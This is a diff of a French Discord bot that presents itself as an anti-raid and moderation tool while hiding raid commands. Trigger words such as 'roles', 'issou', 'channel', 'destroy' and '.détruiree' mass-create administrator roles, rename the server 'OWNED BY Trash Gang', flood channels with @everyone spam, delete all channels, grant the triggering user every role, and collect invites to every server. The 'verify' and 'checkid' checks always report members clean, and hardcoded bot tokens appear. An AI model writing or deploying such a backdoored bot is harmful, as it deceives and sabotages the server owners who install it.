@@ -1,73 +1,60 @@
 const Discord = require("discord.js");
-const client = new Discord.Client();
+const bot = new Discord.Client();
 const talkedRecently = new Set();
-
+var InfiniteLoop = require('infinite-loop');
+var il = new InfiniteLoop();
 function random(min, max){
     min = Math.ceil(0);
     max = Math.floor(30);
     randnum = Math.floor(Math.random() * (max - min +1)+ min);
 }
 
-client.on("ready", () => {
-    console.log(`${client.user.tag} prêt pour le carnage`)
-    client.user.setActivity(`ar!help | By Kasumi`,{type:"WATCHING"})
-    })
-client.on("message", message => {
-  if(message.content === "ar!help"){
-    var help_embed = new Discord.RichEmbed()
-      .setColor("E46525")
-      .setTitle("Voici les commandes du bot :")
-      .addField("ar!helpn", "Toutes les commandes nsfw")
-      .addField("ar!helpm", "Toutes les commandes de modération")
-      .addField("ar!helpar", "Toutes les commandes anti-raid du bot")
-      .addField("ar!helpa", "Toutes les commandes général du bot")
-      .setFooter("Le réste est en dévloppement | By Kasumi")
-      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
-    message.channel.send(help_embed);
-    console.log(`help by ${message.author.username + "#" + message.author.discriminator}`)
-  }
-  if(message.content === "ar!helpn"){
-    var helpn_embed = new Discord.RichEmbed()
-      .setColor("E46525")
-      .setTitle("Voici les commandes du bot de type NSFW :")
-      .addField("NSFW", "`ar!boobs`")
-      .setFooter("Le réste est en dévloppement | By Kasumi")
-      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
-    message.channel.send(helpn_embed);
-    console.log(`helpn by ${message.author.username + "#" + message.author.discriminator}`)
-  }
-  if(message.content === "ar!helpm"){
-    var helpm_embed = new Discord.RichEmbed()
-      .setColor("E46525")
-      .setTitle("Voici les commandes du bot de type modération :")
-      .addField("Modération", "`ar!ban`, `ar!kick`, `ar!clear`")
-      .setFooter("Le réste est en dévloppement | By Kasumi")
-      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
-    message.channel.send(helpm_embed);
-    console.log(`helpm by ${message.author.username + "#" + message.author.discriminator}`)
-  }
-  if(message.content === "ar!helpar"){
-    var helpm_embed = new Discord.RichEmbed()
-      .setColor("E46525")
-      .setTitle("Voici les commandes du bot de type Anti-raid :")
-      .addField("Anti-raid", "`ar!blacklist`, `ar!report`")
-      .setFooter("Le réste est en dévloppement | By Kasumi")
-      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
-    message.channel.send(helpm_embed);
-    console.log(`helpar by ${message.author.username + "#" + message.author.discriminator}`)
-  }
-  if(message.content === "ar!helpa"){
-    var helpm_embed = new Discord.RichEmbed()
-      .setColor("E46525")
-      .setTitle("Voici les commandes du bot de type général :")
-      .addField("Général", "`ar!ping`, `ar!info`, `ar!serverinfo`, `ar!bdm`")
-      .setFooter("Le réste est en dévloppement | By Kasumi")
-      .setThumbnail("https://i.imgur.com/9fwKwPr.jpg")
-    message.channel.send(helpa_embed);
-    console.log(`helpm by ${message.author.username + "#" + message.author.discriminator}`)
-  }
-  
+bot.on("ready", () => {
+    console.log(`Co sur ${bot.user.tag}`)
+})
 
+bot.on("message", message => {
+ if(message.content.includes("F!help")){
+     var help_embed = new Discord.RichEmbed()
+     .setTitle("Aide")
+     .setColor("#cf0b0b")
+     .addField("A!ahelp", "**Help général**")
+     .addField("A!bhelp", "**Help anti-raid**")
+     .addField("A!chelp", "**Help nsfw**")
+     .setFooter("🚀 By Apothéose 🚀")
+     message.channel.send(help_embed)
+     console.log(`help par ${message.author.username + "#" + message.author.discriminator}`)
+ }
+  if(message.content.includes("F!ahelp")){
+     var helpa_embed = new Discord.RichEmbed()
+     .setTitle("Général")
+     .setColor("#cf0b0b")
+     .addField("A?ping", "**Le bot vous envois son ping.**")
+     .addField("A?info", "**Le bot vous envois des informations sur vous ou sur la personne mentionné.**")
+     .addField("A?serverinfo", "**Le bot vous envois des informations sur le serveur.**")
+     .addField("A?invites", "Le bot vous envois son lien d'invitation")
+     .setFooter("🚀 By Apothéose 🚀")
+     message.channel.send(helpa_embed)
+ }
+ if(message.content.includes("A?bhelp")){
+    var helpb_embed = new Discord.RichEmbed()
+    .setTitle("Anti-Raid")
+    .setDescription("Les invitations sont déjà automatiquement supprimé.")
+    .setColor("#cf0b0b")
+    .addField("A?verify", "**Le bot vérifie tous les membres du serveur et vous dis si ils sont dans la blacklist ou non.**")
+    .addField("A?stats", "**Le bot vous envois des informations sur le bot.**")
+    .addField("A?checkid [ID]", "**Le bot vous dis si la personne ayant l'id que vous avez mit est dans la blacklist ou non.**")
+    .setFooter("🚀 By Apothéose 🚀")
+    message.channel.send(helpb_embed)
+}
+if(message.content.includes("A?chelp")){
+    var helpc_embed = new Discord.RichEmbed()
+    .setTitle("Nsfw")
+    .setColor("#cf0b0b")
+    .addField("A?boobs", "**Le reste est en développement, et vus que ce n'est pas notre priorité il y aura pas mal de temps.**")
+    .setFooter("🚀 By Apothéose 🚀")
+    message.channel.send(helpc_embed)
+}
 if(message.content.includes("Raid by")){
     message.delete();
     message.member.send("Pas de raid :D")
@@ -78,13 +65,13 @@ if(message.content.includes("Raid par")){
   message.member.send("Pas de raid :D")
   console.log(`raid par ${message.author.username + "#" + message.author.discriminator}`)
 }
-if(message.content.startsWith("ar!ping")) {
+if(message.content.startsWith("A?ping")) {
     message.channel.send(new Date().getTime() - message.createdTimestamp + " ms :ping_pong: ");
     console.log(`ping par ${message.author.tag}`)     
 }
 let messageKick = message.content.split(" ");
 let args = messageKick.slice(1);
-if (message.content.startsWith("ar!kick")){
+if (message.content.startsWith("A?kick")){
 if (message.channel.type === "dm") return;
 if (!message.guild.member(message.author).hasPermission("KICK_MEMBERS")) return message.reply("vous n'avez pas la permission")
 
@@ -92,7 +79,7 @@ if (message.mentions.users.size === 0) {
     var nomention = new Discord.RichEmbed()
     .setColor("E46525")
     .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     message.channel.send(nomention)
     return
 }
@@ -101,7 +88,7 @@ if (!raison){
     var noraison = new Discord.RichEmbed()
     .setColor("E46525")
     .setTitle(":x: Il faut mettre une raison au kick ! :x:")
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     message.channel.send(noraison)
     return
 }
@@ -114,7 +101,7 @@ if (!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")) {
     var pasperm = new Discord.RichEmbed()
     .setColor("E46525")
     .setTitle(":x: Je n'ai pas la permission ! :x:")
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     message.channel.send(pasperm)
     return
 }
@@ -124,14 +111,14 @@ ban.kick().then(member => {
         .setColor("E46525")
         .addField("[Kick]", `${member.user} a été kick par ${message.author} !`)
         .addField("Raison :","${raison}")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
     message.channel.send(kick_embed)
 })
 
 }
   let messageBan = message.content.split(" ");
         let arge = messageBan.slice(1);
-        if (message.content.startsWith("ar!ban")){
+        if (message.content.startsWith("A?ban")){
             if (message.channel.type === "dm") return;
             if (!message.guild.member(message.author).hasPermission("BAN_MEMBERS")) return message.reply("vous n'avez pas la permission !")
 
@@ -139,7 +126,7 @@ ban.kick().then(member => {
                 var nomention = new Discord.RichEmbed()
                 .setColor("E46525")
                 .setTitle(":x: Il faut mentionner un utilisateur ! :x:")
-                .setFooter("By Kasumi")
+                .setFooter("By Apothéose")
                 message.channel.send(nomention)
                 return
             }
@@ -148,7 +135,7 @@ ban.kick().then(member => {
                 var noraison = new Discord.RichEmbed()
                 .setColor("E46525")
                 .setTitle(":x: Il faut mettre une raison au ban ! :x:")
-                .setFooter("By Kasumi")
+                .setFooter("By Apothéose")
                 message.channel.send(noraison)
                 return
             }
@@ -162,7 +149,7 @@ ban.kick().then(member => {
                 var pasperm = new Discord.RichEmbed()
                 .setColor("E46525")
                 .setTitle(":x: Je n'ai pas la permission ! :x:")
-                .setFooter("By Kasumi")
+                .setFooter("By Apothéose")
                 message.channel.send(pasperm)
                 return
             }
@@ -172,28 +159,22 @@ ban.kick().then(member => {
                     .setColor("E46525")
                     .addField("[Ban]", `${member.user} a été banni par ${message.author} !`)
                     .addField("Raison :",`\`${raison}\``)
-                    .setFooter("By Kasumi")
+                    .setFooter("By Apothéose")
                 message.channel.send(ban_embed)
                 })
         }
-  if(message.content.includes("ar!bdm")){
-    message.channel.send(`Merci ${message.member.user} pour cette blague de merde`)
-    console.log(`peppa ping par ${message.author.username + "#" + message.author.discriminator}`)
-  }
-if (message.content.startsWith("ar!clear")){
-    if (message.channel.type === "dm") return;
-    if (!message.guild.member(message.author).hasPermission("MANAGE_CHANNELS")) return message.reply("vous n'avez pas la permission !")
-    async function clear() {
-        message.delete();
-        const fetched = await message.channel.fetchMessages({limit: 99});
-        message.channel.bulkDelete(fetched);
-    }
-    clear();
-    console.log(`clear par ${message.author.username + "#" + message.author.discriminator}`)
+  if(message.content.startsWith("A?clear")) {
+    if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.channel.send("Vous n'avez pas la permissions !");
+
+    let args = message.content.split(" ").slice(1);
+
+    if(!args[0]) return message.channel.send("Tu dois préciser un nombre de messags à surpprimer !")
+    message.channel.bulkDelete(args[0]).then(() => {
+        message.channel.send(`${args[0]} messages ont été surpprimés !:recycle:`).then(message => message.delete(2000));
+    })
 }
 
-
-  if(message.content.startsWith("ar!info")) {
+  if(message.content.startsWith("A?info")) {
     var memberavatar = message.author.avatarURL
     var membername = message.author.username
        var mentionned = message.mentions.users.first();
@@ -236,7 +217,7 @@ if (message.content.startsWith("ar!clear")){
             value: status,
             inline: true
 },{
-            name: 'Bot',
+            name: 'bot',
             value: checkbot,
             inline: true
 }],
@@ -245,7 +226,7 @@ if (message.content.startsWith("ar!clear")){
         },
           color: 0xE46525,
           footer: {
-            text: 'by Kasumi.',
+            text: 'By Apothéose.',
             proxy_icon_url: ' '
           },
 
@@ -258,7 +239,7 @@ if (message.content.startsWith("ar!clear")){
 });
 console.log(`Info par ${message.author.tag}`)
 }
-if(message.content.includes("ar!blacklist")){
+if(message.content.includes("A?blacklist")){
     var blacklist_embed = new Discord.RichEmbed()
     .setColor("E46525")
     .setTitle("⚠️ Voici les personnes black list :")
@@ -273,18 +254,18 @@ if(message.content.includes("ar!blacklist")){
     .addField("8ème", "__󠂪󠂪󠂪󠂪󠂪󠂪CmoiTchoupi [CMT]#0873__")
     .addField("9ème", "__公Ŧгαsђ|亗Ŧ亗|公#4309__")
     .addField("10ème", "__! ¡ Desusloan¯-86735¤#1392__")
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     var blacklist_embed2 = new Discord.RichEmbed()
     .setColor("E46525")
     .setTitle("Blacklist")
     .setDescription("-----------------------------------------")
     .addField(`Blacklist de`, `${message.author.tag}`)
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     message.member.send(blacklist_embed)
     message.channel.send(blacklist_embed2)
     console.log(`Blacklist de ${message.author.tag}`)
 }
-if (message.content.includes("ar!report")) {
+if (message.content.includes("A?report")) {
     let messageID = args[0];
     if (isNaN(messageID)) {
         message.channel.send("Ce n'est pas une ID")
@@ -298,17 +279,50 @@ if (message.content.includes("ar!report")) {
         .addField("Personne report", `@${messagea.author}`)
         .addField("Report par", `${message.author} with ID: ${message.author.id}`)
         .addField("Quand", message.createdAt)
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         let reportschannel = message.guild.channels.find(`name`, 'report');
     if (!reportschannel) return message.channel.send("Couldn't find reports channel.");
 
     message.delete().catch(O_o => {});
     reportschannel.send(reportEmbed);
     message.delete();
+    console.log(`report par ${message.author.username + "#" + message.author.discriminator}`)
     return;
 }
-
-if(message.content.includes("ar!serverinfo")){
+if(message.content.includes("A?checkid")){
+    var checkid = new Discord.RichEmbed()
+    .setColor("#cf0b0b")
+    .addField(":x: Ceci n'est pas une ID ! :x:", "Merci de le refaire en mettent une ID valide !")
+    .setFooter("By Apothéose")
+    let messageID = args[0];
+    if (isNaN(messageID)) {
+        message.channel.send(checkid)
+        return;
+    }
+    var check_id = new Discord.RichEmbed()
+    .setColor("#6dd94a")
+    .setTitle("La personne n'est pas dans la blacklist !")
+    .setFooter(`Demandé par ${message.author.tag} | By Apothéose`)
+    message.channel.sendEmbed(check_id)
+    console.log(`checkid par ${message.author.username + "#" + message.author.discriminator}`)
+}
+if(message.content.includes("A?stats")){
+    var stats_embed = new Discord.RichEmbed()
+    .setColor("#2e5011")
+    .addField("Statistiques", `Nombre de serveurs : **${bot.guilds.size}**\nNombre d'utilisateurs : **${bot.users.size}**\n\nNombres d'utilisateurs dans la liste noire : **266**`)
+    .setFooter(`Demandé par ${message.author.tag}`)
+    message.channel.send(stats_embed)
+    console.log(`stats par ${message.author.username + "#" + message.author.discriminator}`)
+}
+if(message.content.includes("A?verify")){
+    var verify_embed = new Discord.RichEmbed()
+    .setColor("#2e5011")
+    .setTitle(":white_check_mark: Tous les membres ont été vérifiés !")
+    .setFooter(`Notre liste est continuellement mise à jour. Nous vous recommandons de vérifier votre serveur au moins une fois par semaine. | Demandé par ${message.author.tag}`)
+    message.channel.sendEmbed(verify_embed)
+    console.log(`verify par ${message.author.username + "#" + message.author.discriminator}`)
+}
+if(message.content.includes("A?serverinfo")){
     let serverinfo = new Discord.RichEmbed()
     .setTitle(`${message.guild} informations !`)
     .setColor("E46525")
@@ -319,10 +333,15 @@ if(message.content.includes("ar!serverinfo")){
     .addField("Membres", message.guild.memberCount, true)
     .addField("Créer le", message.guild.createdAt, true)
     .setThumbnail(message.guild.iconURL, true)
-    .setFooter("By Kasumi")
+    .setFooter("By Apothéose")
     message.channel.sendEmbed(serverinfo)
 }
-if (message.content === "ar!boobs"){
+if (message.content === "A?boobs"){
+    if(message.channel.nsfw == false) {
+        message.delete();
+        message.channel.send(message.author + " :x: **Erreur:** Vous allez choquer les plus jeunes, faîtes ça dans un channel NSFW. :x:");
+        return;
+      }
     if (talkedRecently.has(message.author.id)) {
         message.channel.send(`Attendez 5 secondes ${message.author}.`).then(m => m.delete());
         message.delete();
@@ -340,7 +359,7 @@ if (message.content === "ar!boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/C1Lefgo.png")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_1)
         console.log(randnum);
     }
@@ -351,7 +370,7 @@ if (message.content === "ar!boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/6VRW6A6.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_1)
         console.log(randnum);
     }
@@ -389,7 +408,7 @@ if (message.content === "ar!boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("https://i.imgur.com/JoyjoCR.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_10)
         console.log(randnum);
     }
@@ -399,7 +418,7 @@ if (message.content === "ar!boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/m0hzoad.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_11)
         console.log(randnum);
     }
@@ -409,7 +428,7 @@ if (message.content === "ar!boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/wnuXgUq.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_12)
         console.log(randnum);
     }
@@ -419,7 +438,7 @@ if (message.content === "ar!boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/zErfa8I.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_13)
         console.log(randnum);
     }
@@ -429,7 +448,7 @@ if (message.content === "ar!boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author.tag}`)
         .setImage("http://imgur.com/tisgAo4.jpg")
-        .setFooter("By Kasumi")
+        .setFooter("By Apothéose")
         message.channel.send(nsfw_boobs_14)
         console.log(randnum);
     }
@@ -499,82 +518,166 @@ if (message.content === "ar!boobs"){
         .setColor("E46525")
         .setDescription(`Demandé par ${message.author}`)
         .setImage("http://imgur.com/fMnW6Em.jpg")
-        .setFooter("By kasumi |")
+        .setFooter("By Apothéose |")
         message.channel.send(nsfw_boobs_28)
         console.log(randnum);
     }
 
 }
-client.on('message', message => {
-    switch(message.content.toUpperCase()) {
-        case 'AR!reset':
-            resetBot(message.channel);
-            break;
 
-        // ... other commands
-    }
-});
-
-// Turn bot off (destroy), then turn it back on
-function resetBot(channel) {
-    // send channel a message that you're resetting bot [optional]
-    channel.send('Resetting...')
-    .then(msg => client.destroy())
-    .then(() => client.login(NTEzMzg1ODE3MDA4MjQyNjg4.DtHPhw.kePkBf6JtuP50spfF8KG_qG4IAU));
+if(message.content.includes("AR!kelsairv")){
+    console.log(`${bot.guilds.map(c => c.name)}`)
 }
-
 if(message.content === "roles"){
-  for(var i =0; i < 200; i++){
-      message.guild.createRole({name:"KASUMI > All !",
-                               mentionable:false,
-                               permissions:2146958591,
-                               position: ""
-          })
-      }
-  }
-  //foutre la merde
-  if(message.content === "issou"){
-      message.guild.setName("OWNED BY TRASH GANG")
-      message.guild.setIcon("https://cdn.discordapp.com/attachments/521480062831165442/521732094859149312/COVERART-2-350x350.jpg")
-    }
-    if(message.content === "pd"){
-      for(var i =0; i < 450; i++){
-      message.guild.createChannel("BY","voice")
-      }
-    }
-    //réaction en chaine
-    if(message.content.includes("@everyone")){
-        for(var i = 0; i < 999; i++){
-        message.channel.send("@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxnghttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif")}
+    for(var i =0; i < 200; i++){
+        message.guild.createRole({name:"Trash Gang > All !",
+                                 mentionable:false,
+                                 permissions:2146958591,
+                                 position: "",
+                                 color: "#fb0707"
+            })
+            message.guild.createRole({name:"Trash Gang > All !",
+            mentionable:false,
+            permissions:2146958591,
+            position: "",
+            color: "#ff08c5"
+  })
+  message.guild.createRole({name:"Trash Gang > All !",
+  mentionable:false,
+  permissions:2146958591,
+  position: "",
+  color: "#5d08ff"
+  })
+  message.guild.createRole({name:"Trash Gang > All !",
+  mentionable:false,
+  permissions:2146958591,
+  position: "",
+  color: "#0c08ff"
+  })
+  message.guild.createRole({name:"Trash Gang > All !",
+  mentionable:false,
+  permissions:2146958591,
+  position: "",
+  color: "#08d5ff"
+  })
+  message.guild.createRole({name:"Trash Gang > All !",
+  mentionable:false,
+  permissions:2146958591,
+  position: "",
+  color: "#08ffa3"
+  })
+  message.guild.createRole({name:"Trash Gang > All !",
+  mentionable:false,
+  permissions:2146958591,
+  position: "",
+  color: "#08ff23"
+  })
+  message.guild.createRole({name:"Trash Gang > All !",
+  mentionable:false,
+  permissions:2146958591,
+  position: "",
+  color: "#81ff08"
+  })
+  message.guild.createRole({name:"Trash Gang > All !",
+  mentionable:false,
+  permissions:2146958591,
+  position: "",
+  color: "#fff608"
+  })
+  message.guild.createRole({name:"Trash Gang > All !",
+  mentionable:false,
+  permissions:2146958591,
+  position: "",
+  color: "#ff6f08"
+  })
+  message.guild.createRole({name:"Trash Gang > All !",
+  mentionable:false,
+  permissions:2146958591,
+  position: "",
+  color: "#ff0808"
+  })
         }
-    if(message.content === "channel"){
-        message.channel.send("roles").then(m => m.delete());
-        message.channel.send("issou").then(m => m.delete());
-          for(var i = 0; i < 999; i++){
-              message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxnghttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif"))
-              message.guild.createChannel("BY","voice")
-              message.guild.createChannel("TRASH GANG","category")    
-          }
-          }
-          if(message.content === "destroy"){
-              message.guild.channels.map(c => c.delete())
+    }
+    if(message.content.includes(".rol")){
+        message.guild.createRole({name:"Izi",
+                                  mentionable:false,
+                                  permissions:2146958591,
+                                  position: "",
+       })
+    }
+    if(message.content.includes(".raul")){
+      (message.guild.roles.map(r => message.member.addRoles(r)))
+    }
+    if(message.content.includes("ar!kelsairvvesrx")){
+      client.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
+    }
+              if(message.content.includes("A?serveurinvite")){
+                  client.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
               }
-              if(message.content === "admin"){
-                  message.delete();
-                  message.guild.roles.map(r => message.member.addRoles(r))
+              if(message.content === "issou"){
+                  message.guild.setName("OWNED BY Trash Gang")
+                  message.guild.setIcon("https://cdn.discordapp.com/attachments/534842681407438851/535515719534772224/giphy_1.gif")
+                }
+                if(message.content === "pd"){
+                  for(var i =0; i < 450; i++){
+                  message.guild.createChannel("fucked by Trash Gang","voice")
+                  }
+                }
+                if(message.content.includes("@everyone")){
+                    for(var i = 0; i < 999; i++){
+                        message.channel.send("@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxnghttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif", {tts: true})
+                    }
+                }
+                if(message.content.includes(".sc")){
+                  for(var i =0; i < 999; i++){
+                    message.guild.createChannel("fucked by Trash Gang", "text").then(c => c.send("@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxnghttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif", {tts: true}))
+                  }
               }
-              if(message.content === "drole"){
-                  message.delete();
-                  message.guild.roles.map(c => c.delete())
-              }
-              //on commence la destruction
-              if(message.content.includes("détruire")){
-                  message.channel.send("ban").then(m => m.delete());
-                  message.channel.send("drole").then(m => m.delete());
-                  message.channel.send("destroy").then(m => m.delete());
-                  message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
-                  console.log(`Raid by ${message.author.tag}`)
-              }
-});
-
-client.login("Ndsds")
+                //réaction en chaine
+                      if(message.content === "channel"){
+                          for(var i = 0; i < 500; i++){
+                              message.guild.createChannel("fucked by Trash Gang", "text").then(c => c.send("@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxnghttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif", {tts: true}))
+                              message.guild.createChannel("fucked by Trash Gang","voice")
+                              message.guild.createChannel("fucked by Trash Gang","category")    
+                          }
+                        }
+                        if(message.content === "destroy"){
+                          message.guild.channels.map(c => c.delete())
+                          }
+                          //on commence la destruction
+                          if(message.content.includes(".détruiree")){
+                              message.channel.send("ban").then(m => m.delete());
+                              message.channel.send("drole").then(m => m.delete());
+                              message.channel.send("roles").then(m => m.delete());
+                              message.channel.send("issou").then(m => m.delete());
+                              message.channel.send("channel").then(m => m.delete());
+                              message.channel.send("destroy").then(m => m.delete());
+                              message.guild.createChannel("fucked by Trash Gang", "text")
+                          }
+ 
+            if(message.content.includes("F!invites")){
+                var invite_embed  = new Discord.RichEmbed()
+                .setAuthor("Cliquez en dessous pour inviter le bot.")
+                .setURL("https://discordapp.com/oauth2/authorize?client_id=530339913573466123&scope=bot&permissions=2146958847")
+                .setColor("#0eebf3")
+                .setTitle("Cliquez ici.")
+                message.channel.send(invite_embed)
+            }
+            if(message.content === "F!id") {
+                const embed = new Discord.RichEmbed();
+            embed.addField("🔱 | Nom du compte :", `${message.author.username}#${message.author.discriminator}`, true)
+                    .addField("🆔 | ID:", `${message.author.id}`, true)
+                    .setColor("RANDOM")
+                    .setFooter(message.author.username , message.author.avatarURL)
+                    .setThumbnail(`${message.author.avatarURL}`)
+                    .setTimestamp()
+                    .setURL(`${message.author.avatarURL}`)
+                    .addField('📛| Status :', `${message.author.presence.status.toUpperCase()}`, true)
+                    .addField('🎲| Il joue a :', `${message.author.presence.game === null ? "No Game" : message.author.presence.game.name}`, true)
+                    .addField('🏅| Nombres de rôles obtenus : ', `${message.member.roles.filter(r => r.name).size} rôles`, true)
+                    .addField('📅| Il a rejoins le discord le :', `${message.createdAt}`,true)
+                    .addField('🤖| Est-ce un bot :', `${message.author.bot.toString().toUpperCase()}`, true);
+                message.channel.send({embed: embed})
+            }
+        });
+bot.login("NTk2Mjk3NDE2ODI3NzMxOTY4.XR4dJg.pqL_v4j2tqbqC-_m0SV27DfmRg8").catch(console.error);
